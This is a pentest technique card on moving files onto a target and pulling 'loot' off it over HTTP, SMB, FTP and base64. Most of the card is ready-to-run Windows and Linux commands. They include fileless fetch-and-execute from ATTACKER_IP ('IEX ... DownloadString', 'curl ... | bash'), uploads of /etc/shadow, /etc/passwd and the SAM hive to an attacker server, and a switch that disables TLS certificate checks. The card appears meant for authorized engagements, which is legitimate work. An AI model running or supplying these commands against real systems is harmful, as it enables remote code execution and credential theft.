---
tool: File transfer (web, SMB, FTP)
slug: file-transfer
kind: technique
stages: [delivery]
category: Getting files on and off a host
platforms: [windows, linux]
services: [http, smb, ftp]
ports: [80, 443, 445, 21, 8000]
tags: [file-transfer, download, upload, smbserver, uploadserver, exfil]
attack: [T1105, T1570]
summary: The everyday ways to move a tool onto a target or pull loot back, over HTTP, SMB or FTP. Host a server on your box, then fetch or push from the target with what it already has.
references:
  - Impacket smbserver | https://github.com/fortra/impacket/blob/master/examples/smbserver.py
  - Python uploadserver | https://github.com/Densaugeo/uploadserver
  - pyftpdlib | https://github.com/giampaolo/pyftpdlib
---

## Pick a channel

HTTP/HTTPS egresses almost everywhere and is encrypted in transit, so it is the default. SMB (445) and FTP (21) are usually blocked outbound, so keep them for the internal leg. When nothing is allowed out, fall back to copy and paste (base64) or an alternate channel.

## Host a server on your attacking box

```bash
# HTTP, serve the current directory
python3 -m http.server 8000

# HTTP with an upload endpoint (POST to /upload)
python3 -m uploadserver 8000

# SMB share (add -user/-password; new Windows refuses guest access)
impacket-smbserver share "$(pwd)" -smb2support
impacket-smbserver share "$(pwd)" -smb2support -user pt -password pt

# FTP (anonymous unless you set a user; --write to allow uploads)
sudo python3 -m pyftpdlib --port 21 --write
```

## Windows: download

```powershell
# WebClient (works on every PowerShell version)
(New-Object Net.WebClient).DownloadFile("http://ATTACKER_IP:8000/wp.exe","C:\Windows\Temp\wp.exe")
# Invoke-WebRequest (slower; -UseBasicParsing avoids the IE engine error)
iwr http://ATTACKER_IP:8000/wp.exe -OutFile C:\Windows\Temp\wp.exe -UseBasicParsing
# Fileless: run in memory, nothing touches disk
IEX (New-Object Net.WebClient).DownloadString("http://ATTACKER_IP:8000/script.ps1")
# Bypass a self-signed TLS error first
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

```cmd
:: SMB share you host (map a drive if guest is blocked)
copy \\ATTACKER_IP\share\wp.exe C:\Windows\Temp\
net use n: \\ATTACKER_IP\share /user:pt pt && copy n:\wp.exe
:: FTP with a scripted command file (non-interactive shells)
echo open ATTACKER_IP> ftp.txt& echo USER anonymous>> ftp.txt& echo binary>> ftp.txt& echo GET wp.exe>> ftp.txt& echo bye>> ftp.txt& ftp -v -n -s:ftp.txt
```

## Windows: upload

```powershell
# To a Python uploadserver, via a small helper script
IEX(New-Object Net.WebClient).DownloadString("http://ATTACKER_IP:8000/PSUpload.ps1")
Invoke-FileUpload -Uri http://ATTACKER_IP:8000/upload -File C:\Windows\System32\drivers\etc\hosts
# To an FTP server
(New-Object Net.WebClient).UploadFile("ftp://ATTACKER_IP/hosts","C:\Windows\System32\drivers\etc\hosts")
# To an SMB share you host
copy C:\loot\sam.hive \\ATTACKER_IP\share\
```

## Linux: download and upload

```bash
# Download
wget http://ATTACKER_IP:8000/linpeas.sh -O /tmp/linpeas.sh
curl http://ATTACKER_IP:8000/tool -o /tmp/tool
scp pt@ATTACKER_IP:/srv/tool /tmp/tool
# Fileless: pipe straight into a shell or interpreter
curl http://ATTACKER_IP:8000/linpeas.sh | bash
wget -qO- http://ATTACKER_IP:8000/x.py | python3

# Upload to a uploadserver (use --insecure with a self-signed cert on HTTPS)
curl -X POST http://ATTACKER_IP:8000/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow'
scp /etc/passwd pt@ATTACKER_IP:/loot/
```

## Base64 copy and paste (no network)

```bash
# On the source, print one base64 line
cat id_rsa | base64 -w 0; echo
# On the target, paste and decode (Linux)
echo -n '<base64>' | base64 -d > id_rsa
```

```powershell
# Windows decode / encode
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa",[Convert]::FromBase64String("<base64>"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\loot\file"))
```

**Verify** every transfer with a hash: `md5sum file` on Linux, `Get-FileHash file -Algorithm MD5` on Windows. `cmd.exe` caps a command at 8,191 characters, so base64 is for small files.

## Notes

Keep tools and loot inside the engagement scope, and clean up what you drop. New Windows blocks unauthenticated guest SMB, so set a user on `impacket-smbserver`. For the fastest, quietest path, host over HTTP and fetch with PowerShell `iwr` or a Linux `curl`; reach for SMB, FTP or base64 only when that is blocked.
